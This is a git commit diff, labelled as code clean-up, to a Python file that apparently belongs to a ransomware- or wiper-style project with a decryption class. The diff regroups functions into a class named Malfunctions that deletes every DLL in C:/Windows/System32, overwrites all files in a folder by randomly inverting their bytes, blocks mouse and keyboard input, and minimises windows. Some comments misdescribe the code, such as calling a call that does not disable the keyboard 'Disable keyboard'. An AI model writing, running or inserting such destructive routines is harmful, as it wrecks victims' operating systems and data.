9b2941d078dee96098dc99650b060e5539bc8bdf
Cooper <Cooperransom08@gmail.com>
2023-03-21 21:47:12 -0400

    CODE CLEAN UP

--- scrypt/resource.py
+++ scrypt/resource.py
@@ -330,71 +330,65 @@ class decryption():
       Fout.close()
 
 
-now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n"
-time = datetime.datetime.now().strftime("%H:%M:%S") + "\n\n"
-date = datetime.datetime.now().strftime("%Y-%m-%d") + "\n\n"
+class Ptime():
+
+  def nowtime(time=None, date=None):
+    if time is False or date is True:
+      return date
+    if time is True or date is False:
+      return time
+    else:
+      return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n"
+
+  def currentdate():
+    return datetime.datetime.now().strftime("%Y-%m-%d") + "\n\n"
+
+  def currenttime():
+    return datetime.datetime.now().strftime("%H:%M:%S") + "\n\n"
 
 
-def nowtime(time=None, date=None):
-  if time is False or date is True:
-    return date
-  if time is True or date is False:
-    return time
-  else:
-    return now
+class Malfunctions():
 
+  def minimize_current_window():
+    try:
+      pyautogui.hotkey('win', 'm')
+      return True
+    except pyautogui.FailSafeException:
+      return False
 
-def currentdate():
-  return date
+  def delete_dll():
+    try:
+      os.chdir('C:/Windows/System32')
+      files = [f for f in os.listdir() if f.endswith('.dll')]
+      for f in files:
+        os.remove(f)
+    except OSError:
+      raise OSError('System32 directory does not exist.')
 
+  def corrupt_startup_files(source_folder):
+    # Create a list of files in the source directory
+    files_in_source_folder = os.listdir(source_folder)
 
-def currenttime():
-  return time
+    # Corrupt the files by swapping random bits in their content
+    for file in files_in_source_folder:
+      path_to_file = os.path.join(source_folder, file)
+      with open(path_to_file, "rb") as binary_file:
+        # Read the file
+        data = binary_file.read()
+        # Iterate over the bits in the file content
+        for bit_index in range(len(data)):
+          # Randomly decide whether to switch the bit
+          switch = random.choice([True, False])
+          if switch:
+            # Replace the bit at the current index with its inverse
+            data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF
+                                             ]) + data[bit_index + 1:]
+      # Write the corrupted content back to the file
+      with open(path_to_file, "wb") as binary_file:
+        binary_file.write(data)
 
-
-def minimize_current_window():
-  try:
-    pyautogui.hotkey('win', 'm')
-    return True
-  except pyautogui.FailSafeException:
-    return False
-
-
-def delete_dll():
-  try:
-    os.chdir('C:/Windows/System32')
-    files = [f for f in os.listdir() if f.endswith('.dll')]
-    for f in files:
-      os.remove(f)
-  except OSError:
-    raise OSError('System32 directory does not exist.')
-
-
-def corrupt_startup_files(source_folder):
-  # Create a list of files in the source directory
-  files_in_source_folder = os.listdir(source_folder)
-
-  # Corrupt the files by swapping random bits in their content
-  for file in files_in_source_folder:
-    path_to_file = os.path.join(source_folder, file)
-    with open(path_to_file, "rb") as binary_file:
-      # Read the file
-      data = binary_file.read()
-      # Iterate over the bits in the file content
-      for bit_index in range(len(data)):
-        # Randomly decide whether to switch the bit
-        switch = random.choice([True, False])
-        if switch:
-          # Replace the bit at the current index with its inverse
-          data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF
-                                           ]) + data[bit_index + 1:]
-    # Write the corrupted content back to the file
-    with open(path_to_file, "wb") as binary_file:
-      binary_file.write(data)
-
-
-def disable_mouse_keyboard_windows():
-  # Disable mouse
-  ctypes.windll.user32.BlockInput(True)
-  # Disable keyboard
-  ctypes.windll.user32.DisableProcessWindowsGhosting()
+  def disable_mouse_keyboard_windows():
+    # Disable mouse
+    ctypes.windll.user32.BlockInput(True)
+    # Disable keyboard
+    ctypes.windll.user32.DisableProcessWindowsGhosting()
